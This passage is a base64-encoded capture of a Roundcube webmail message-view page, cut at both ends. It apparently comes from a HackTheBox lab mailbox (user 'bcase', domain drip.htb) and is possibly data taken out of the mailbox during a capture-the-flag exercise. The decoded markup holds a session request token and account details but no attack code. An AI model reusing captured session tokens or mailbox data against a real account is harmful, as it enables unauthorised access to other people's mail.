J3ZWJwIjoiMSIsInBncG1pbWUiOiIwIn0sInVpZCI6IjMiLCJzYWZlbW9kZSI6dHJ1ZSwibWVzc2FnZV9jb250ZXh0IjpudWxsLCJtZXNzYWdlX2ZsYWdzIjpbInNlZW4iXSwic2VuZGVyIjoia3VqZW4gXHUwMDNDa3VqZW5AZHJpcC5odGJcdTAwM0UiLCJtYWlsYm94IjoiSU5CT1giLCJ1c2VybmFtZSI6ImJjYXNlIiwicGVybWF1cmwiOiIvP190YXNrPW1haWwmX2FjdGlvbj1zaG93Jl91aWQ9MyZfbWJveD1JTkJPWCIsImhhc193cml0ZWFibGVfYWRkcmVzc2Jvb2siOnRydWUsImRlbGltaXRlciI6Ii4iLCJtaW1ldHlwZXMiOlsidGV4dC9wbGFpbiIsInRleHQvaHRtbCIsImltYWdlL2pwZWciLCJpbWFnZS9naWYiLCJpbWFnZS9wbmciLCJpbWFnZS9ibXAiLCJpbWFnZS90aWZmIiwiaW1hZ2Uvd2VicCIsImFwcGxpY2F0aW9uL3gtamF2YXNjcmlwdCIsImFwcGxpY2F0aW9uL3BkZiIsIm1lc3NhZ2UvcmZjODIyIl0sInJlYWRfd2hlbl9kZWxldGVkIjp0cnVlLCJkaXNwbGF5X25leHQiOnRydWUsIm9wdGlvbmFsX2Zvcm1hdCI6InRleHQiLCJtYWlsYm94ZXMiOnsiSU5CT1giOnsiaWQiOiJJTkJPWCIsIm5hbWUiOiJJbmJveCIsInZpcnR1YWwiOmZhbHNlLCJjbGFzcyI6ImluYm94In19LCJtYWlsYm94ZXNfbGlzdCI6WyJJTkJPWCJdLCJyZXF1ZXN0X3Rva2VuIjoiUXBkVDhKTVprSzBsNXMyM0c4S2tETmdPUWw3cDlDY2EifSk7CnJjbWFpbC5hZGRfbGFiZWwoeyJsb2FkaW5nIjoiTG9hZGluZy4uLiIsInNlcnZlcmVycm9yIjoiU2VydmVyIEVycm9yISIsImNvbm5lcnJvciI6IkNvbm5lY3Rpb24gRXJyb3IgKEZhaWxlZCB0byByZWFjaCB0aGUgc2VydmVyKSEiLCJyZXF1ZXN0dGltZWRvdXQiOiJSZXF1ZXN0IHRpbWVkIG91dCIsInJlZnJlc2hpbmciOiJSZWZyZXNoaW5nLi4uIiwid2luZG93b3BlbmVycm9yIjoiVGhlIHBvcHVwIHdpbmRvdyB3YXMgYmxvY2tlZCEiLCJ1cGxvYWRpbmdtYW55IjoiVXBsb2FkaW5nIGZpbGVzLi4uIiwidXBsb2FkaW5nIjoiVXBsb2FkaW5nIGZpbGUuLi4iLCJjbG9zZSI6IkNsb3NlIiwic2F2ZSI6IlNhdmUiLCJjYW5jZWwiOiJDYW5jZWwiLCJhbGVydHRpdGxlIjoiQXR0ZW50aW9uIiwiY29uZmlybWF0aW9udGl0bGUiOiJBcmUgeW91IHN1cmUuLi4iLCJkZWxldGUiOiJEZWxldGUiLCJjb250aW51ZSI6IkNvbnRpbnVlIiwib2siOiJPSyIsImNoZWNraW5nbWFpbCI6IkNoZWNraW5nIGZvciBuZXcgbWVzc2FnZXMuLi4iLCJkZWxldGVtZXNzYWdlIjoiRGVsZXRlIG1lc3NhZ2UiLCJtb3ZlbWVzc2FnZXRvdHJhc2giOiJNb3ZlIG1lc3NhZ2UgdG8gdHJhc2giLCJtb3ZpbmdtZXNzYWdlIjoiTW92aW5nIG1lc3NhZ2UocykuLi4iLCJkZWxldGluZ21lc3NhZ2UiOiJEZWxldGluZyBtZXNzYWdlKHMpLi4uIiwibWFya2luZ21lc3NhZ2UiOiJNYXJraW5nIG1lc3NhZ2UocykuLi4iLCJyZXBseWFsbCI6IlJlcGx5IGFsbCIsInJlcGx5bGlzdCI6IlJlcGx5IGxpc3QiLCJib3VuY2UiOiJSZXNlbmQiLCJib3VuY2Vtc2ciOiJSZXNlbmQgKGJvdW5jZSkiLCJzZW5kaW5nbWVzc2FnZSI6IlNlbmRpbmcgbWVzc2FnZS4uLiIsImJhY2siOiJCYWNrIiwiZXJyb3J0aXRsZSI6IkFuIGVycm9yIG9jY3VycmVkISIsIm9wdGlvbnMiOiJPcHRpb25zIiwicGxhaW50b2dnbGUiOiJQbGFpbiB0ZXh0IiwiaHRtbHRvZ2dsZSI6IkhUTUwiLCJwcmV2aW91cyI6IlByZXZpb3VzIiwibmV4dCI6Ik5leHQiLCJzZWxlY3QiOiJTZWxlY3QiLCJicm93c2UiOiJCcm93c2UiLCJjaG9vc2VmaWxlIjoiQ2hvb3NlIGZpbGUuLi4iLCJjaG9vc2VmaWxlcyI6IkNob29zZSBmaWxlcy4uLiIsInB1cmdlZm9sZGVyY29uZmlybSI6IkRvIHlvdSByZWFsbHkgd2FudCB0byBkZWxldGUgYWxsIG1lc3NhZ2VzIGluIHRoaXMgZm9sZGVyPyIsImRlbGV0ZW1lc3NhZ2VzY29uZmlybSI6IkRvIHlvdSByZWFsbHkgd2FudCB0byBkZWxldGUgc2VsZWN0ZWQgbWVzc2FnZShzKT8iLCJ2aWV3c291cmNlIjoiU2hvdyBzb3VyY2UiLCJkZXRhaWxzIjoiRGV0YWlscyIsInN1bW1hcnkiOiJTdW1tYXJ5IiwiYXJpYWxhYmVsbWVzc2FnZWhlYWRlcnMiOiJNZXNzYWdlIGhlYWRlcnMifSk7CnJjbWFpbC5ndWlfY29udGFpbmVyKCJ0b29sYmFyIiwibWFpbHRvb2xiYXIiKTsKcmNtYWlsLmd1aV9jb250YWluZXIoImZvcndhcmRtZW51IiwiZm9yd2FyZC1tZW51Iik7CnJjbWFpbC5ndWlfY29udGFpbmVyKCJyZXBseWFsbG1lbnUiLCJyZXBseWFsbC1tZW51Iik7CnJjbWFpbC5ndWlfY29udGFpbmVyKCJtZXNzYWdlbWVudSIsIm1lc3NhZ2UtbWVudSIpOwpyY21haWwuZ3VpX2NvbnRhaW5lcigibWFya21lbnUiLCJtYXJrbWVzc2FnZS1tZW51Iik7CnJjbWFpbC5ndWlfY29udGFpbmVyKCJoZWFkZXJsaW5rcyIsImhlYWRlci1saW5rcyIpOwpyY21haWwuZ3VpX2NvbnRhaW5lcigiYXR0YWNobWVudG1lbnUiLCJhdHRhY2htZW50bWVudSIpOwpyY21haWwuZ3VpX2NvbnRhaW5lcigibWFpbHRvbWVudSIsIm1haWx0by1tZW51Iik7cmNtYWlsLnJlZ2lzdGVyX2J1dHRvbignY29tcG9zZScsICdyY21idG4xMDAnLCAnbGluaycsICcnLCAnJywgJycpOwpyY21haWwucmVnaXN0ZXJfYnV0dG9uKCdyZXBseScsICdyY21idG4xMDEnLCAnbGluaycsICdyZXBseScsICcnLCAnJyk7CnJjbWFpbC5yZWdpc3Rlcl9idXR0b24oJ3JlcGx5LWFsbCcsICdyY21idG4xMDInLCAnbGluaycsICdyZXBseS1hbGwnLCAnJywgJycpOwpyY21haWwucmVnaXN0ZXJfYnV0dG9uKCdmb3J3YXJkJywgJ3JjbWJ0bjEwMycsICdsaW5rJywgJ2ZvcndhcmQnLCAnJywgJycpOwpyY21haWwucmVnaXN0ZXJfYnV0dG9uKCdkZWxldGUnLCAncmNtYnRuMTA0JywgJ2xpbmsnLCAnZGVsZXRlJywgJycsICcnKTsKcmNtYWlsLnJlZ2lzdGVyX2J1dHRvbigncHJpbnQnLCAncmNtYnRuMTA1JywgJ2xpbmsnLCAncHJpbnQnLCAnJywgJycpOwpyY21haWwucmVnaXN0ZXJfYnV0dG9uKCdwcmV2aW91c21lc3NhZ2UnLCAncmNtYnRuMTA2JywgJ2xpbmsnLCAncHJldicsICcnLCAnJyk7CnJjbWFpbC5yZWdpc3Rlcl9idXR0b24oJ25leHRtZXNzYWdlJywgJ3JjbWJ0bjEwNycsICdsaW5rJywgJ25leHQnLCAnJywgJycpOwpyY21haWwucmVnaXN0ZXJfYnV0dG9uKCdmb3J3YXJkLWlubGluZScsICdyY21idG4xMDgnLCAnbGluaycsICdmb3J3YXJkIGlubGluZSBhY3RpdmUnLCAnJywgJycpOwpyY21haWwucmVnaXN0ZXJfYnV0dG9uKCdmb3J3YXJkLWF0dGFjaG1lbnQnLCAncmNtYnRuMTA5JywgJ2xpbmsnLCAnZm9yd2FyZCBhdHRhY2htZW50IGFjdGl2ZScsICcnLCAnJyk7CnJjbWFpbC5yZWdpc3Rlcl9idXR0b24oJ2JvdW5jZScsICdyY21idG4xMTAnLCAnbGluaycsICdmb3J3YXJkIGJvdW5jZSBhY3RpdmUnLCAnJywgJycpOwpyY21haWwucmVnaXN0ZXJfYnV0dG9uKCdyZXBseS1hbGwnLCAncmNtYnRuMTExJywgJ2xpbmsnLCAncmVwbHkgYWxsIGFjdGl2ZScsICcnLCAnJyk7CnJjbWFpbC5yZWdpc3Rlcl9idXR0b24oJ3JlcGx5LWxpc3QnLCAncmNtYnRuMTEyJywgJ2xpbmsnLCAncmVwbHkgbGlzdCBhY3RpdmUnLCAnJywgJycpOwpyY21haWwucmVnaXN0ZXJfYnV0dG9uKCdwcmludCcsICdyY21idG4xMTMnLCAnbGluaycsICdwcmludCBhY3RpdmUnLCAnJywgJycpOwpyY21haWwucmVnaXN0ZXJfYnV0dG9uKCdkb3dubG9hZCcsICdyY21idG4xMTQnLCAnbGluaycsICdkb3dubG9hZCBhY3RpdmUnLCAnJywgJycpOwpyY21haWwucmVnaXN0ZXJfYnV0dG9uKCdlZGl0JywgJ3JjbWJ0bjExNScsICdsaW5rJywgJ2VkaXQgYXNuZXcgYWN0aXZlJywgJycsICcnKTsKcmNtYWlsLnJlZ2lzdGVyX2J1dHRvbigndmlld3NvdXJjZScsICdyY21idG4xMTYnLCAnbGluaycsICdzb3VyY2UgYWN0aXZlJywgJycsICcnKTsKcmNtYWlsLnJlZ2lzdGVyX2J1dHRvbignbW92ZScsICdyY21idG4xMTcnLCAnbGluaycsICdtb3ZlIGFjdGl2ZScsICcnLCAnJyk7CnJjbWFpbC5yZWdpc3Rlcl9idXR0b24oJ2NvcHknLCAncmNtYnRuMTE4JywgJ2xpbmsnLCAnY29weSBhY3RpdmUnLCAnJywgJycpOwpyY21haWwucmVnaXN0ZXJfYnV0dG9uKCdvcGVuJywgJ3JjbWJ0bjExOScsICdsaW5rJywgJ2V4dHdpbiBhY3RpdmUnLCAnJywgJycpOwpyY21haWwucmVnaXN0ZXJfYnV0dG9uKCdtYXJrJywgJ3JjbWJ0bjEyMCcsICdsaW5rJywgJ3JlYWQgYWN0aXZlJywgJycsICcnKTsKcmNtYWlsLnJlZ2lzdGVyX2J1dHRvbignbWFyaycsICdyY21idG4xMjEnLCAnbGluaycsICd1bnJlYWQgYWN0aXZlJywgJycsICcnKTsKcmNtYWlsLnJlZ2lzdGVyX2J1dHRvbignbWFyaycsICdyY21idG4xMjInLCAnbGluaycsICdmbGFnIGFjdGl2ZScsICcnLCAnJyk7CnJjbWFpbC5yZWdpc3Rlcl9idXR0b24oJ21hcmsnLCAncmNtYnRuMTIzJywgJ2xpbmsnLCAndW5mbGFnIGFjdGl2ZScsICcnLCAnJyk7CnJjbWFpbC5yZWdpc3Rlcl9idXR0b24oJ2NoYW5nZS1mb3JtYXQnLCAncmNtYnRuMTI0JywgJ2xpbmsnLCAnJywgJycsICcnKTsKcmNtYWlsLmd1aV9vYmplY3QoJ3JlbW90ZW9iamVjdHNtc2cnLCAncmVtb3RlLW9iamVjdHMtbWVzc2FnZScpOwpyY21haWwuZ3VpX29iamVjdCgnbWVzc2FnZWJvZHknLCAnbWVzc2FnZWJvZHknKTsKcmNtYWlsLnJlZ2lzdGVyX2J1dHRvbignb3Blbi1hdHRhY2htZW50JywgJ2F0dGFjaG1lbnVvcGVuJywgJ2xpbmsnLCAnZXh0d2luIGFjdGl2ZScsICcnLCAnJyk7CnJjbWFpbC5yZWdpc3Rlcl9idXR0b24oJ2Rvd25sb2FkLWF0dGFjaG1lbnQnLCAnYXR0YWNobWVudWRvd25sb2FkJywgJ2xpbmsnLCAnZG93bmxvYWQgYWN0aXZlJywgJycsICcnKTsKcmNtYWlsLmd1aV9vYmplY3QoJ21lc3NhZ2UnLCAnbWVzc2FnZXN0YWNrJyk7Cjwvc2NyaXB0PgoKPHNjcmlwdCBzcmM9InBsdWdpbnMvanF1ZXJ5dWkvanMvanF1ZXJ5LXVpLm1pbi5qcz9zPTE3MTYxMDcyMzciPjwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5IGNsYXNzPSJ0YXNrLW1haWwgYWN0aW9uLXNob3ciPgoJCgkJPGRpdiBpZD0ibGF5b3V0Ij4KCQoKCgoKCjxoMSBjbGFzcz0idm9pY2UiPk1lc3NhZ2UgcHJldmlldzwvaDE+Cgo8ZGl2IGlkPSJsYXlvdXQtY29udGVudCIgY2xhc3M9InNlbGVjdGVkIj4KCQoJCTxoMiBpZD0iYXJpYS1sYWJlbC10b29sYmFyIiBjbGFzcz0idm9pY2UiPkFwcGxpY2F0aW9uIHRvb2xiYXI8L2gyPgoJCTxkaXYgY2xhc3M9ImhlYWRlciIgcm9sZT0idG9vbGJhciIgYXJpYS1sYWJlbGxlZGJ5PSJhcmlhLWxhYmVsLXRvb2xiYXIiPgoJCQk8YSBjbGFzcz0iYnV0dG9uIGljb24gYmFjay1saXN0LWJ1dHRvbiIgaHJlZj0iI2JhY2siPjxzcGFuIGNsYXNzPSJpbm5lciI+QmFjazwvc3Bhbj48L2E+CgkJCTxzcGFuIGNsYXNzPSJoZWFkZXItdGl0bGUiPjwvc3Bhbj4KCQkJCjxkaXYgaWQ9Im1haWx0b29sYmFyIiBjbGFzcz0idG9vbGJhciBtZW51IiByb2xlPSJ0b29sYmFyIj4KCTxhIGNsYXNzPSJjb21wb3NlIGhpZGRlbiIgdGl0bGU9IkNyZWF0ZSBhIG5ldyBtZXNzYWdlIiBpZD0icmNtYnRuMTAwIiByb2xlPSJidXR0b24iIGhyZWY9Ii8/X3Rhc2s9bWFpbCZhbXA7X2FjdGlvbj1jb21wb3NlIiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ2NvbXBvc2UnLCcnLHRoaXMsZXZlbnQpIj48c3BhbiBjbGFzcz0iaW5uZXIiPkNvbXBvc2U8L3NwYW4+PC9hPgoJPGEgY2xhc3M9InJlcGx5IGRpc2FibGVkIiB0aXRsZT0iUmVwbHkgdG8gc2VuZGVyIiBkYXRhLWNvbnRlbnQtYnV0dG9uPSJ0cnVlIiBpZD0icmNtYnRuMTAxIiByb2xlPSJidXR0b24iIHRhYmluZGV4PSItMSIgYXJpYS1kaXNhYmxlZD0idHJ1ZSIgaHJlZj0iIyIgb25jbGljaz0icmV0dXJuIHJjbWFpbC5jb21tYW5kKCdyZXBseScsJycsdGhpcyxldmVudCkiPjxzcGFuIGNsYXNzPSJpbm5lciI+UmVwbHk8L3NwYW4+PC9hPgoJPHNwYW4gY2xhc3M9ImRyb3BidXR0b24iPgoJCTxhIGNsYXNzPSJyZXBseS1hbGwgZGlzYWJsZWQiIHRpdGxlPSJSZXBseSB0byBsaXN0IG9yIHRvIHNlbmRlciBhbmQgYWxsIHJlY2lwaWVudHMiIGlkPSJyY21idG4xMDIiIHJvbGU9ImJ1dHRvbiIgdGFiaW5kZXg9Ii0xIiBhcmlhLWRpc2FibGVkPSJ0cnVlIiBocmVmPSIjIiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ3JlcGx5LWFsbCcsJycsdGhpcyxldmVudCkiPjxzcGFuIGNsYXNzPSJpbm5lciI+UmVwbHkgYWxsPC9zcGFuPjwvYT4KCQk8YSBocmVmPSIjcmVwbHktYWxsIiBpZD0icmVwbHlhbGxtZW51bGluayIgY2xhc3M9ImRyb3Bkb3duIiBkYXRhLXBvcHVwPSJyZXBseWFsbC1tZW51IiB0YWJpbmRleD0iMCI+CgkJCTxzcGFuIGNsYXNzPSJpbm5lciI+UmVwbHktYWxsIG9wdGlvbnM8L3NwYW4+CgkJPC9hPgoJPC9zcGFuPgoJPHNwYW4gY2xhc3M9ImRyb3BidXR0b24iPgoJCTxhIGNsYXNzPSJmb3J3YXJkIGRpc2FibGVkIiB0aXRsZT0iRm9yd2FyZCB0aGUgbWVzc2FnZSIgaWQ9InJjbWJ0bjEwMyIgcm9sZT0iYnV0dG9uIiB0YWJpbmRleD0iLTEiIGFyaWEtZGlzYWJsZWQ9InRydWUiIGhyZWY9IiMiIG9uY2xpY2s9InJldHVybiByY21haWwuY29tbWFuZCgnZm9yd2FyZCcsJycsdGhpcyxldmVudCkiPjxzcGFuIGNsYXNzPSJpbm5lciI+Rm9yd2FyZDwvc3Bhbj48L2E+CgkJPGEgaHJlZj0iI2ZvcndhcmQiIGlkPSJmb3J3YXJkbWVudWxpbmsiIGNsYXNzPSJkcm9wZG93biIgZGF0YS1wb3B1cD0iZm9yd2FyZC1tZW51IiB0YWJpbmRleD0iMCI+CgkJCTxzcGFuIGNsYXNzPSJpbm5lciI+Rm9yd2FyZGluZyBvcHRpb25zPC9zcGFuPgoJCTwvYT4KCTwvc3Bhbj4KCTxzcGFuIGNsYXNzPSJzcGFjZXIiPjwvc3Bhbj4KCTxhIGNsYXNzPSJkZWxldGUgZGlzYWJsZWQiIHRpdGxlPSJEZWxldGUgbWVzc2FnZSIgaWQ9InJjbWJ0bjEwNCIgcm9sZT0iYnV0dG9uIiB0YWJpbmRleD0iLTEiIGFyaWEtZGlzYWJsZWQ9InRydWUiIGhyZWY9IiMiIG9uY2xpY2s9InJldHVybiByY21haWwuY29tbWFuZCgnZGVsZXRlJywnJyx0aGlzLGV2ZW50KSI+PHNwYW4gY2xhc3M9ImlubmVyIj5EZWxldGU8L3NwYW4+PC9hPgoJCgkJPGEgY2xhc3M9InByaW50IGRpc2FibGVkIiB0aXRsZT0iUHJpbnQgdGhpcyBtZXNzYWdlIiBkYXRhLWhpZGRlbj0ic21hbGwiIGlkPSJyY21idG4xMDUiIHJvbGU9ImJ1dHRvbiIgdGFiaW5kZXg9Ii0xIiBhcmlhLWRpc2FibGVkPSJ0cnVlIiBocmVmPSIjIiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ3ByaW50JywnJyx0aGlzLGV2ZW50KSI+PHNwYW4gY2xhc3M9ImlubmVyIj5QcmludDwvc3Bhbj48L2E+CgkKCQoJPGEgaWQ9Im1hcmttZXNzYWdlbWVudWxpbmsiIGNsYXNzPSJtYXJrbWVzc2FnZSIgdGl0bGU9Ik1hcmsgbWVzc2FnZXMiIGRhdGEtcG9wdXA9Im1hcmttZXNzYWdlLW1lbnUiIHJvbGU9ImJ1dHRvbiIgaHJlZj0iIyI+PHNwYW4gY2xhc3M9ImlubmVyIj5NYXJrPC9zcGFuPjwvYT4KCTxhIGlkPSJtZXNzYWdlbWVudWxpbmsiIGNsYXNzPSJtb3JlIiB0aXRsZT0iTW9yZSBhY3Rpb25zLi4uIiBkYXRhLXBvcHVwPSJtZXNzYWdlLW1lbnUiIHJvbGU9ImJ1dHRvbiIgaHJlZj0iIyI+PHNwYW4gY2xhc3M9ImlubmVyIj5Nb3JlPC9zcGFuPjwvYT4KCQoJCTxzcGFuIGNsYXNzPSJzcGFjZXIiPjwvc3Bhbj4KCQk8YSBjbGFzcz0icHJldiBkaXNhYmxlZCIgdGl0bGU9IlNob3cgcHJldmlvdXMgbWVzc2FnZSIgZGF0YS1oaWRkZW49InNtYWxsIiBpZD0icmNtYnRuMTA2IiByb2xlPSJidXR0b24iIHRhYmluZGV4PSItMSIgYXJpYS1kaXNhYmxlZD0idHJ1ZSIgaHJlZj0iIyIgb25jbGljaz0icmV0dXJuIHJjbWFpbC5jb21tYW5kKCdwcmV2aW91c21lc3NhZ2UnLCcnLHRoaXMsZXZlbnQpIj48c3BhbiBjbGFzcz0iaW5uZXIiPlByZXZpb3VzPC9zcGFuPjwvYT4KCQk8YSBjbGFzcz0ibmV4dCBkaXNhYmxlZCIgdGl0bGU9IlNob3cgbmV4dCBtZXNzYWdlIiBkYXRhLWhpZGRlbj0ic21hbGwiIGlkPSJyY21idG4xMDciIHJvbGU9ImJ1dHRvbiIgdGFiaW5kZXg9Ii0xIiBhcmlhLWRpc2FibGVkPSJ0cnVlIiBocmVmPSIjIiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ25leHRtZXNzYWdlJywnJyx0aGlzLGV2ZW50KSI+PHNwYW4gY2xhc3M9ImlubmVyIj5OZXh0PC9zcGFuPjwvYT4KCQo8L2Rpdj4KCjxkaXYgaWQ9ImZvcndhcmQtbWVudSIgY2xhc3M9InBvcHVwbWVudSI+Cgk8aDMgaWQ9ImFyaWEtbGFiZWwtZm9yd2FyZC1tZW51IiBjbGFzcz0idm9pY2UiPkZvcndhcmRpbmcgb3B0aW9uczwvaDM+Cgk8dWwgY2xhc3M9Im1lbnUgbGlzdGluZyIgcm9sZT0ibWVudSIgYXJpYS1sYWJlbGxlZGJ5PSJhcmlhLWxhYmVsLWZvcndhcmQtbWVudSI+CgkJPGxpIHJvbGU9Im1lbnVpdGVtIj48YSBjbGFzcz0iZm9yd2FyZCBpbmxpbmUgZGlzYWJsZWQiIGlkPSJyY21idG4xMDgiIHJvbGU9ImJ1dHRvbiIgdGFiaW5kZXg9Ii0xIiBhcmlhLWRpc2FibGVkPSJ0cnVlIiBocmVmPSIjIiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ2ZvcndhcmQtaW5saW5lJywnc3ViJyx0aGlzLGV2ZW50KSI+Rm9yd2FyZCBpbmxpbmU8L2E+PC9saT4KCQk8bGkgcm9sZT0ibWVudWl0ZW0iPjxhIGNsYXNzPSJmb3J3YXJkIGF0dGFjaG1lbnQgZGlzYWJsZWQiIGlkPSJyY21idG4xMDkiIHJvbGU9ImJ1dHRvbiIgdGFiaW5kZXg9Ii0xIiBhcmlhLWRpc2FibGVkPSJ0cnVlIiBocmVmPSIjIiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ2ZvcndhcmQtYXR0YWNobWVudCcsJ3N1YicsdGhpcyxldmVudCkiPkZvcndhcmQgYXMgYXR0YWNobWVudDwvYT48L2xpPgoJCTxsaSByb2xlPSJtZW51aXRlbSI+PGEgY2xhc3M9ImZvcndhcmQgYm91bmNlIGRpc2FibGVkIiBpZD0icmNtYnRuMTEwIiByb2xlPSJidXR0b24iIHRhYmluZGV4PSItMSIgYXJpYS1kaXNhYmxlZD0idHJ1ZSIgaHJlZj0iIyIgb25jbGljaz0icmV0dXJuIHJjbWFpbC5jb21tYW5kKCdib3VuY2UnLCcnLHRoaXMsZXZlbnQpIj5SZXNlbmQgKGJvdW5jZSk8L2E+PC9saT4KCQkKCTwvdWw+CjwvZGl2PgoKPGRpdiBpZD0icmVwbHlhbGwtbWVudSIgY2xhc3M9InBvcHVwbWVudSI+Cgk8aDMgaWQ9ImFyaWEtbGFiZWwtcmVwbHlhbGwtbWVudSIgY2xhc3M9InZvaWNlIj5SZXBseS1hbGwgb3B0aW9uczwvaDM+Cgk8dWwgY2xhc3M9Im1lbnUgbGlzdGluZyIgcm9sZT0ibWVudSIgYXJpYS1sYWJlbGxlZGJ5PSJhcmlhLWxhYmVsLXJlcGx5YWxsLW1lbnUiPgoJCTxsaSByb2xlPSJtZW51aXRlbSI+PGEgY2xhc3M9InJlcGx5IGFsbCBkaXNhYmxlZCIgaWQ9InJjbWJ0bjExMSIgcm9sZT0iYnV0dG9uIiB0YWJpbmRleD0iLTEiIGFyaWEtZGlzYWJsZWQ9InRydWUiIGhyZWY9IiMiIG9uY2xpY2s9InJldHVybiByY21haWwuY29tbWFuZCgncmVwbHktYWxsJywnc3ViJyx0aGlzLGV2ZW50KSI+UmVwbHkgYWxsPC9hPjwvbGk+CgkJPGxpIHJvbGU9Im1lbnVpdGVtIj48YSBjbGFzcz0icmVwbHkgbGlzdCBkaXNhYmxlZCIgaWQ9InJjbWJ0bjExMiIgcm9sZT0iYnV0dG9uIiB0YWJpbmRleD0iLTEiIGFyaWEtZGlzYWJsZWQ9InRydWUiIGhyZWY9IiMiIG9uY2xpY2s9InJldHVybiByY21haWwuY29tbWFuZCgncmVwbHktbGlzdCcsJ3N1YicsdGhpcyxldmVudCkiPlJlcGx5IGxpc3Q8L2E+PC9saT4KCQkKCTwvdWw+CjwvZGl2PgoKPGRpdiBpZD0ibWVzc2FnZS1tZW51IiBjbGFzcz0icG9wdXBtZW51Ij4KCTxoMyBpZD0iYXJpYS1sYWJlbC1tZXNzYWdlLW1lbnUiIGNsYXNzPSJ2b2ljZSI+TW9yZSBtZXNzYWdlIGFjdGlvbnM8L2gzPgoJPHVsIGNsYXNzPSJtZW51IGxpc3RpbmciIHJvbGU9Im1lbnUiIGFyaWEtbGFiZWxsZWRieT0iYXJpYS1sYWJlbC1tZXNzYWdlLW1lbnUiPgoJCTxsaSByb2xlPSJtZW51aXRlbSI+PGEgY2xhc3M9InByaW50IGRpc2FibGVkIiBkYXRhLWhpZGRlbj0ic21hbGwiIGlkPSJyY21idG4xMTMiIHJvbGU9ImJ1dHRvbiIgdGFiaW5kZXg9Ii0xIiBhcmlhLWRpc2FibGVkPSJ0cnVlIiBocmVmPSIjIiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ3ByaW50JywnJyx0aGlzLGV2ZW50KSI+UHJpbnQgdGhpcyBtZXNzYWdlPC9hPjwvbGk+CgkJCgkJPGxpIHJvbGU9Im1lbnVpdGVtIj48YSBjbGFzcz0iZG93bmxvYWQgZGlzYWJsZWQiIGlkPSJyY21idG4xMTQiIHJvbGU9ImJ1dHRvbiIgdGFiaW5kZXg9Ii0xIiBhcmlhLWRpc2FibGVkPSJ0cnVlIiBocmVmPSIjIiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ2Rvd25sb2FkJywnJyx0aGlzLGV2ZW50KSI+RXhwb3J0PC9hPjwvbGk+CgkJPGxpIHJvbGU9Im1lbnVpdGVtIj48YSBjbGFzcz0iZWRpdCBhc25ldyBkaXNhYmxlZCIgaWQ9InJjbWJ0bjExNSIgcm9sZT0iYnV0dG9uIiB0YWJpbmRleD0iLTEiIGFyaWEtZGlzYWJsZWQ9InRydWUiIGhyZWY9IiMiIG9uY2xpY2s9InJldHVybiByY21haWwuY29tbWFuZCgnZWRpdCcsJ25ldycsdGhpcyxldmVudCkiPkVkaXQgYXMgbmV3PC9hPjwvbGk+CgkJPGxpIHJvbGU9Im1lbnVpdGVtIj48YSBjbGFzcz0ic291cmNlIGRpc2FibGVkIiBpZD0icmNtYnRuMTE2IiByb2xlPSJidXR0b24iIHRhYmluZGV4PSItMSIgYXJpYS1kaXNhYmxlZD0idHJ1ZSIgaHJlZj0iIyIgb25jbGljaz0icmV0dXJuIHJjbWFpbC5jb21tYW5kKCd2aWV3c291cmNlJywnJyx0aGlzLGV2ZW50KSI+U2hvdyBzb3VyY2U8L2E+PC9saT4KCQk8bGkgcm9sZT0ibWVudWl0ZW0iPjxhIGNsYXNzPSJtb3ZlIGRpc2FibGVkIiBhcmlhLWhhc3BvcHVwPSJ0cnVlIiBpZD0icmNtYnRuMTE3IiByb2xlPSJidXR0b24iIHRhYmluZGV4PSItMSIgYXJpYS1kaXNhYmxlZD0idHJ1ZSIgaHJlZj0iIyIgb25jbGljaz0icmV0dXJuIHJjbWFpbC5jb21tYW5kKCdtb3ZlJywnJyx0aGlzLGV2ZW50KSI+PHNwYW4gY2xhc3M9ImZvbGRlci1zZWxlY3Rvci1saW5rIj5Nb3ZlIHRvLi4uPC9zcGFuPjwvYT48L2xpPgoJCTxsaSByb2xlPSJtZW51aXRlbSI+PGEgY2xhc3M9ImNvcHkgZGlzYWJsZWQiIGFyaWEtaGFzcG9wdXA9InRydWUiIGlkPSJyY21idG4xMTgiIHJvbGU9ImJ1dHRvbiIgdGFiaW5kZXg9Ii0xIiBhcmlhLWRpc2FibGVkPSJ0cnVlIiBocmVmPSIjIiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ2NvcHknLCcnLHRoaXMsZXZlbnQpIj48c3BhbiBjbGFzcz0iZm9sZGVyLXNlbGVjdG9yLWxpbmsiPkNvcHkgdG8uLi48L3NwYW4+PC9hPjwvbGk+CgkJPGxpIHJvbGU9Im1lbnVpdGVtIj48YSB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImV4dHdpbiBkaXNhYmxlZCIgZGF0YS1oaWRkZW49InNtYWxsIiBpZD0icmNtYnRuMTE5IiByb2xlPSJidXR0b24iIHRhYmluZGV4PSItMSIgYXJpYS1kaXNhYmxlZD0idHJ1ZSIgaHJlZj0iIyIgb25jbGljaz0icmV0dXJuIHJjbWFpbC5jb21tYW5kKCdvcGVuJywnJyx0aGlzLGV2ZW50KSI+T3BlbiBpbiBuZXcgd2luZG93PC9hPjwvbGk+CgkJCgk8L3VsPgo8L2Rpdj4KCjxkaXYgaWQ9Im1hcmttZXNzYWdlLW1lbnUiIGNsYXNzPSJwb3B1cG1lbnUiPgoJPGgzIGlkPSJhcmlhLWxhYmVsLW1hcmttZXNzYWdlLW1lbnUiIGNsYXNzPSJ2b2ljZSI+TWFyayBzZWxlY3RlZCBtZXNzYWdlcyBhcy4uLjwvaDM+Cgk8dWwgY2xhc3M9Im1lbnUgbGlzdGluZyIgcm9sZT0ibWVudSIgYXJpYS1sYWJlbGxlZGJ5PSJhcmlhLWxhYmVsLW1hcmttZXNzYWdlLW1lbnUiPgoJCTxsaSByb2xlPSJtZW51aXRlbSI+PGEgY2xhc3M9InJlYWQgZGlzYWJsZWQiIGlkPSJyY21idG4xMjAiIHJvbGU9ImJ1dHRvbiIgdGFiaW5kZXg9Ii0xIiBhcmlhLWRpc2FibGVkPSJ0cnVlIiBocmVm